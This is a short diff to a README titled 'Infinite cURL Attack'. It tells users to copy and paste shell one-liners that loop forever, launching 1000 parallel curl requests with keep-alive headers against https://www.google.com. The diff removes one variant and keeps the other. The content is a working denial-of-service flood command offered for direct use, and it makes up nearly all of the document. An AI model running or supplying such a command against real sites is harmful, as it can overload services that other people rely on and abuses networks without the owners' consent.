@@ -5,10 +5,6 @@ Infinite cURL Attack
 
 **USAGE** : Copy-Paste-Edit the following code in the Terminal/CMD.
 ```
-while (true); do xargs -I % -P 1000 curl -v --header "Connection: keep-alive" "https://www.google.com" \ < <(printf '%s\n' {1..1000}); done;
-```
-OR
-```
 while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -I -v --header "Connection: keep-alive" "https://www.google.com"; done;
 ```
 
